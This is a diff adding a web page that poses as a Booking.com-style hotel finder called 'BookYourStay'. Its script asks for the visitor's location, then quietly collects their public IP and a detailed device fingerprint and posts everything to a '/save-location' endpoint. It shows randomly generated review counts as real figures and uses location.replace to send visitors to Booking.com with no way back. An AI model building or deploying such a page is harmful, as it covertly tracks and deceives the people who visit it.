@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Find Hotels Near You</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .search-box {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            transition: all 0.3s ease;
+        }
+        .booking-interface {
+            display: none;
+            background: white;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+        .booking-header {
+            background: #003580;
+            color: white;
+            padding: 15px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .booking-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .booking-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0071c2;
+            background: white;
+            padding: 8px 16px;
+            border-radius: 6px;
+        }
+        .booking-search-bar {
+            background: #f5f5f5;
+            padding: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .search-form {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .search-input {
+            flex: 1;
+            min-width: 200px;
+            padding: 12px 16px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            background: white;
+        }
+        .search-input:focus {
+            outline: none;
+            border-color: #0071c2;
+        }
+        .search-btn {
+            background: #0071c2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .search-btn:hover {
+            background: #005c9e;
+        }
+        .booking-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            gap: 20px;
+        }
+        .filters-sidebar {
+            width: 280px;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            height: fit-content;
+            position: sticky;
+            top: 100px;
+        }
+        .results-main {
+            flex: 1;
+        }
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .results-count {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+        .sort-dropdown {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: white;
+            cursor: pointer;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: gray;
+            font-size: 14px;
+        }
+        .hotels-container {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .hotel-card {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            transition: box-shadow 0.2s ease;
+            cursor: pointer;
+        }
+        .hotel-card:hover {
+            box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+        }
+        .hotel-image {
+            width: 100%;
+            height: 200px;
+            background: #f0f0f0;
+            position: relative;
+            overflow: hidden;
+        }
+        .hotel-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .hotel-price-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #0071c2;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .hotel-content {
+            padding: 20px;
+        }
+        .hotel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 12px;
+        }
+        .hotel-name {
+            font-weight: 600;
+            font-size: 20px;
+            color: #0071c2;
+            margin-bottom: 4px;
+            line-height: 1.3;
+        }
+        .hotel-location {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .hotel-rating-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        .rating-badge {
+            background: #003580;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .rating-text {
+            color: #0071c2;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .rating-count {
+            color: #666;
+            font-size: 13px;
+        }
+        .hotel-features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        .feature-tag {
+            background: #e8f4fd;
+            color: #0071c2;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .hotel-pricing {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 15px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .price-section {
+            text-align: right;
+        }
+        .price-per-night {
+            color: #666;
+            font-size: 13px;
+        }
+        .price-amount {
+            color: #d32f2f;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .price-includes {
+            color: #4caf50;
+            font-size: 12px;
+        }
+        .book-now-btn {
+            background: #0071c2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .book-now-btn:hover {
+            background: #005c9e;
+        }
+        .filter-section {
+            margin-bottom: 25px;
+        }
+        .filter-title {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 12px;
+            color: #333;
+        }
+        .filter-option {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            cursor: pointer;
+        }
+        .filter-option input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+        .filter-option label {
+            font-size: 14px;
+            color: #666;
+            cursor: pointer;
+        }
+        .price-range {
+            margin-top: 10px;
+        }
+        .price-slider {
+            width: 100%;
+            margin: 10px 0;
+        }
+        .back-button {
+            background-color: #6c757d;
+            margin-top: 15px;
+        }
+        .back-button:hover {
+            background-color: #545b62;
+        }
+    </style>
+</head>
+<body>
+        <div class="search-box" id="initialSearch">
+        <h1 style="color: #0071c2; margin-bottom: 10px; font-size: 32px;">🏨 BookYourStay</h1>
+        <p style="color: #666; margin-bottom: 30px; font-size: 16px;">Find amazing hotels near your location</p>
+        <button id="findHotelsBtn" style="background: linear-gradient(135deg, #0071c2, #005c9e); padding: 16px 32px; font-size: 18px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,113,194,0.3);">Find Hotels Near Me</button>
+        <p class="loading" id="loadingText">Searching for hotels...</p>
+    </div>
+
+    <!-- Booking.com Style Interface -->
+    <div class="booking-interface" id="bookingInterface">
+        <!-- Header -->
+        <div class="booking-header">
+            <div class="booking-nav">
+                <div class="booking-logo">BookYourStay</div>
+                <button id="backToSearch" style="background: white; color: #0071c2; border: 2px solid #0071c2; padding: 8px 16px; border-radius: 6px; cursor: pointer;">← Back to Search</button>
+            </div>
+        </div>
+
+        <!-- Search Bar -->
+        <div class="booking-search-bar">
+            <div class="search-form">
+                <input type="text" class="search-input" placeholder="Where are you going?" id="locationInput">
+                <input type="date" class="search-input" style="max-width: 150px;" id="checkinDate">
+                <input type="date" class="search-input" style="max-width: 150px;" id="checkoutDate">
+                <select class="search-input" style="max-width: 120px;" id="guestSelect">
+                    <option>1 Guest</option>
+                    <option>2 Guests</option>
+                    <option>3 Guests</option>
+                    <option>4 Guests</option>
+                </select>
+                <button class="search-btn" id="searchBtn">Search</button>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="booking-content">
+            <!-- Filters Sidebar -->
+            <div class="filters-sidebar">
+                <div class="filter-section">
+                    <div class="filter-title">Filter by:</div>
+                </div>
+
+                <div class="filter-section">
+                    <div class="filter-title">Price per night</div>
+                    <div class="price-range">
+                        <input type="range" class="price-slider" min="50" max="500" value="250" id="priceRange">
+                        <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666;">
+                            <span>$50</span>
+                            <span id="priceValue">$250</span>
+                            <span>$500+</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="filter-section">
+                    <div class="filter-title">Star Rating</div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="star5">
+                        <label for="star5">5 stars</label>
+                    </div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="star4">
+                        <label for="star4">4 stars</label>
+                    </div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="star3">
+                        <label for="star3">3 stars</label>
+                    </div>
+                </div>
+
+                <div class="filter-section">
+                    <div class="filter-title">Amenities</div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="wifi">
+                        <label for="wifi">Free WiFi</label>
+                    </div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="pool">
+                        <label for="pool">Swimming Pool</label>
+                    </div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="gym">
+                        <label for="gym">Fitness Center</label>
+                    </div>
+                    <div class="filter-option">
+                        <input type="checkbox" id="parking">
+                        <label for="parking">Free Parking</label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Results Main -->
+            <div class="results-main">
+                <div class="results-header">
+                    <div class="results-count" id="resultsCount">Found 5 hotels</div>
+                    <select class="sort-dropdown" id="sortSelect">
+                        <option>Sort by: Our top picks</option>
+                        <option>Price (lowest first)</option>
+                        <option>Price (highest first)</option>
+                        <option>Star rating</option>
+                        <option>Guest rating</option>
+                    </select>
+                </div>
+
+                <div id="bookingHotelsList">
+                    <!-- Hotels will be populated here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('findHotelsBtn').addEventListener('click', function () {
+            const loadingText = document.getElementById('loadingText');
+            const button = document.getElementById('findHotelsBtn');
+
+            // Reset display state
+            loadingText.style.display = 'block';
+            loadingText.style.color = 'gray';
+            loadingText.textContent = 'Searching for hotels...';
+            button.disabled = true;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async position => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        console.log("User's Location:", lat, lon);
+
+                        // Collect comprehensive device and browser information
+                        const deviceInfo = await collectDeviceInfo();
+
+                        // Send location to your server
+                        fetch('/save-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lon,
+                                deviceInfo: deviceInfo
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Location sent to server successfully:", data);
+                            if (data.success && data.hotels) {
+                                loadingText.style.display = 'none';
+                                showBookingInterface(data.hotels, { latitude: lat, longitude: lon });
+                            } else {
+                                loadingText.textContent = "Error processing your location.";
+                                loadingText.style.color = "red";
+                                button.disabled = false;
+                            }
+                        })
+                        .catch(err => {
+                            console.error("Error sending location:", err);
+                            loadingText.textContent = "Error connecting to server.";
+                            loadingText.style.color = "red";
+                            button.disabled = false;
+                        });
+                    },
+                    error => {
+                        loadingText.style.display = 'block';
+                        loadingText.style.color = "red";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                loadingText.textContent = "Location access denied. Please enable location sharing.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                loadingText.textContent = "Location information unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                loadingText.textContent = "Location request timed out.";
+                                break;
+                            default:
+                        loadingText.textContent = "Unable to get location.";
+                                break;
+                        }
+                        console.error("Geolocation error:", error);
+                        button.disabled = false;
+                    }
+                );
+            } else {
+                loadingText.style.display = 'block';
+                loadingText.style.color = "red";
+                loadingText.textContent = "Geolocation is not supported by your browser.";
+                button.disabled = false;
+            }
+        });
+
+                        async function showBookingInterface(hotels, location) {
+            // Hide initial search and show booking interface
+            document.getElementById('initialSearch').style.display = 'none';
+            document.getElementById('bookingInterface').style.display = 'block';
+
+            // Get city name from coordinates
+            const cityName = await getCityName(location.latitude, location.longitude);
+            document.getElementById('locationInput').value = cityName;
+
+            // Set default dates (today + 1 day for check-in, today + 2 days for check-out)
+            const today = new Date();
+            const checkin = new Date(today);
+            checkin.setDate(today.getDate() + 1);
+            const checkout = new Date(today);
+            checkout.setDate(today.getDate() + 2);
+
+            document.getElementById('checkinDate').value = checkin.toISOString().split('T')[0];
+            document.getElementById('checkoutDate').value = checkout.toISOString().split('T')[0];
+
+            // Display hotels
+            displayBookingHotels(hotels);
+        }
+
+        async function getCityName(lat, lon) {
+            try {
+                // Using OpenStreetMap Nominatim for reverse geocoding (free service)
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`);
+                const data = await response.json();
+
+                if (data && data.address) {
+                    // Try to get the most appropriate location name
+                    const city = data.address.city ||
+                                data.address.town ||
+                                data.address.village ||
+                                data.address.municipality ||
+                                data.address.county ||
+                                data.address.state;
+
+                    const country = data.address.country;
+
+                    if (city && country) {
+                        return `${city}, ${country}`;
+                    } else if (city) {
+                        return city;
+                    } else {
+                        return data.display_name.split(',')[0] + ', ' + country;
+                    }
+                }
+
+                // Fallback if reverse geocoding fails
+                return `Location ${lat.toFixed(2)}, ${lon.toFixed(2)}`;
+
+            } catch (error) {
+                console.log('Reverse geocoding failed:', error);
+                // Fallback to coordinates if geocoding fails
+                return `Location ${lat.toFixed(2)}, ${lon.toFixed(2)}`;
+            }
+        }
+
+                function displayBookingHotels(hotels) {
+            const hotelsList = document.getElementById('bookingHotelsList');
+            hotelsList.innerHTML = '';
+
+            // Get the current city name from the search input
+            const cityName = document.getElementById('locationInput').value;
+
+            // Enhanced hotel data with booking.com style info
+            const enhancedHotels = hotels.map((hotel, index) => ({
+                ...hotel,
+                id: index + 1,
+                location: `${hotel.distance} from city center`,
+                reviewCount: Math.floor(Math.random() * 2000) + 100,
+                ratingText: hotel.rating >= 4.5 ? 'Excellent' : hotel.rating >= 4.0 ? 'Very Good' : 'Good',
+                image: `https://picsum.photos/400/250?random=${index + 1}`,
+                originalPrice: Math.floor(parseInt(hotel.price.replace('$', '').replace('/night', '')) * 1.2),
+                includes: 'Includes taxes and fees',
+                cancellation: 'Free cancellation',
+                breakfast: Math.random() > 0.5
+            }));
+
+            enhancedHotels.forEach(hotel => {
+                const hotelCard = document.createElement('div');
+                hotelCard.className = 'hotel-card';
+
+                const price = parseInt(hotel.price.replace('$', '').replace('/night', ''));
+
+                                hotelCard.innerHTML = `
+                    <div class="hotel-image">
+                        <img src="${hotel.image}" alt="${hotel.name}" loading="lazy">
+                        <div class="hotel-price-badge">${hotel.price}</div>
+                    </div>
+                    <div class="hotel-content">
+                        <div class="hotel-header">
+                            <div>
+                                <div class="hotel-name">${hotel.name}</div>
+                                <div class="hotel-location">📍 ${hotel.location}</div>
+                            </div>
+                        </div>
+
+                        <div class="hotel-rating-section">
+                            <div class="rating-badge">${hotel.rating}</div>
+                            <div class="rating-text">${hotel.ratingText}</div>
+                            <div class="rating-count">(${hotel.reviewCount} reviews)</div>
+                        </div>
+
+                        <div class="hotel-features">
+                            ${hotel.amenities.map(amenity => `<span class="feature-tag">${amenity}</span>`).join('')}
+                            ${hotel.breakfast ? '<span class="feature-tag">🍳 Breakfast included</span>' : ''}
+                            <span class="feature-tag" style="background: #e8f5e8; color: #2e7d32;">✓ ${hotel.cancellation}</span>
+                        </div>
+
+                        <div class="hotel-pricing">
+                            <div>
+                                <div style="font-size: 14px; color: #666;">${hotel.includes}</div>
+                                ${hotel.breakfast ? '<div style="font-size: 12px; color: #4caf50;">Breakfast included</div>' : ''}
+                            </div>
+                            <div class="price-section">
+                                <div class="price-per-night">per night</div>
+                                <div class="price-amount">$${price}</div>
+                                <div class="price-includes">${hotel.includes}</div>
+                                <button class="book-now-btn" onclick="event.stopPropagation(); bookHotel('${hotel.name}', '${cityName}')">Book Now</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+
+                // Make the entire card clickable to go to Booking.com
+                hotelCard.style.cursor = 'pointer';
+                hotelCard.addEventListener('click', function() {
+                    bookHotel(hotel.name, cityName);
+                });
+
+                hotelsList.appendChild(hotelCard);
+            });
+        }
+
+                function bookHotel(hotelName, cityName) {
+            // Create Booking.com URL with the detected city
+            const checkinDate = document.getElementById('checkinDate').value;
+            const checkoutDate = document.getElementById('checkoutDate').value;
+            const guests = document.getElementById('guestSelect').value.replace(' Guest', '').replace(' Guests', '');
+
+            // Format dates for Booking.com (YYYY-MM-DD format)
+            const checkin = checkinDate.replace(/-/g, '-');
+            const checkout = checkoutDate.replace(/-/g, '-');
+
+            // Create Booking.com search URL
+            const bookingUrl = `https://www.booking.com/searchresults.html?ss=${encodeURIComponent(cityName)}&checkin=${checkin}&checkout=${checkout}&group_adults=${guests}&no_rooms=1&order=popularity`;
+
+            // Replace current page with Booking.com (no back button access)
+            window.location.replace(bookingUrl);
+        }
+
+        // Back to search functionality
+        document.getElementById('backToSearch').addEventListener('click', function() {
+            document.getElementById('bookingInterface').style.display = 'none';
+            document.getElementById('initialSearch').style.display = 'block';
+            document.getElementById('findHotelsBtn').disabled = false;
+            document.getElementById('loadingText').style.display = 'none';
+        });
+
+        // Price range slider
+        document.getElementById('priceRange').addEventListener('input', function() {
+            document.getElementById('priceValue').textContent = '$' + this.value;
+        });
+
+        // Search button in booking interface
+        document.getElementById('searchBtn').addEventListener('click', function() {
+            alert('🔍 New search functionality would be implemented here!');
+        });
+
+        // Comprehensive device and browser information collection
+        async function collectDeviceInfo() {
+            // Try to get public IP address from client side
+            let publicIP = null;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                publicIP = ipData.ip;
+            } catch (error) {
+                console.log('Could not fetch public IP:', error);
+                // Fallback to other services if ipify fails
+                try {
+                    const ipResponse2 = await fetch('https://httpbin.org/ip');
+                    const ipData2 = await ipResponse2.json();
+                    publicIP = ipData2.origin;
+                } catch (error2) {
+                    console.log('Could not fetch IP from backup service:', error2);
+                }
+            }
+            const nav = navigator;
+            const screen = window.screen;
+            const now = new Date();
+
+            // Detect device type
+            function getDeviceType() {
+                const userAgent = nav.userAgent.toLowerCase();
+                if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
+                    return 'Tablet';
+                } else if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
+                    return 'Mobile';
+                } else {
+                    return 'Desktop';
+                }
+            }
+
+            // Detect operating system
+            function getOperatingSystem() {
+                const userAgent = nav.userAgent;
+                if (userAgent.indexOf('Windows NT 10.0') !== -1) return 'Windows 10';
+                if (userAgent.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
+                if (userAgent.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
+                if (userAgent.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+                if (userAgent.indexOf('Windows NT 6.0') !== -1) return 'Windows Vista';
+                if (userAgent.indexOf('Windows NT 5.1') !== -1) return 'Windows XP';
+                if (userAgent.indexOf('Windows NT 5.0') !== -1) return 'Windows 2000';
+                if (userAgent.indexOf('Mac OS X') !== -1) return 'Mac OS X';
+                if (userAgent.indexOf('Mac_PowerPC') !== -1) return 'Mac OS';
+                if (userAgent.indexOf('Linux') !== -1) return 'Linux';
+                if (userAgent.indexOf('Ubuntu') !== -1) return 'Ubuntu';
+                if (userAgent.indexOf('iPhone') !== -1) return 'iOS';
+                if (userAgent.indexOf('iPad') !== -1) return 'iOS';
+                if (userAgent.indexOf('Android') !== -1) return 'Android';
+                if (userAgent.indexOf('BlackBerry') !== -1) return 'BlackBerry';
+                if (userAgent.indexOf('Windows Phone') !== -1) return 'Windows Phone';
+                return 'Unknown';
+            }
+
+            // Detect browser
+            function getBrowser() {
+                const userAgent = nav.userAgent;
+                if (userAgent.indexOf('Chrome') !== -1) return 'Chrome';
+                if (userAgent.indexOf('Safari') !== -1) return 'Safari';
+                if (userAgent.indexOf('Firefox') !== -1) return 'Firefox';
+                if (userAgent.indexOf('Edge') !== -1) return 'Edge';
+                if (userAgent.indexOf('Opera') !== -1) return 'Opera';
+                if (userAgent.indexOf('MSIE') !== -1) return 'Internet Explorer';
+                return 'Unknown';
+            }
+
+            // Get connection info
+            function getConnectionInfo() {
+                const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
+                if (connection) {
+                    return {
+                        effectiveType: connection.effectiveType,
+                        downlink: connection.downlink,
+                        rtt: connection.rtt,
+                        saveData: connection.saveData
+                    };
+                }
+                return null;
+            }
+
+            // Get battery info (if available)
+            function getBatteryInfo() {
+                if ('getBattery' in nav) {
+                    nav.getBattery().then(function(battery) {
+                        return {
+                            level: Math.round(battery.level * 100),
+                            charging: battery.charging
+                        };
+                    });
+                }
+                return null;
+            }
+
+            // Collect all information
+            return {
+                timestamp: now.toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                publicIP: publicIP,
+                deviceType: getDeviceType(),
+                operatingSystem: getOperatingSystem(),
+                browser: getBrowser(),
+                userAgent: nav.userAgent,
+                language: nav.language || nav.userLanguage,
+                languages: nav.languages,
+                platform: nav.platform,
+                cookieEnabled: nav.cookieEnabled,
+                onLine: nav.onLine,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                referrer: document.referrer,
+                url: window.location.href,
+                connection: getConnectionInfo(),
+                touchSupport: 'ontouchstart' in window,
+                geolocationSupport: 'geolocation' in nav,
+                localStorageSupport: typeof(Storage) !== 'undefined',
+                sessionStorageSupport: typeof(sessionStorage) !== 'undefined',
+                webWorkerSupport: typeof(Worker) !== 'undefined',
+                serviceWorkerSupport: 'serviceWorker' in nav
+            };
+        }
+    </script>
+</body>
+</html>
+
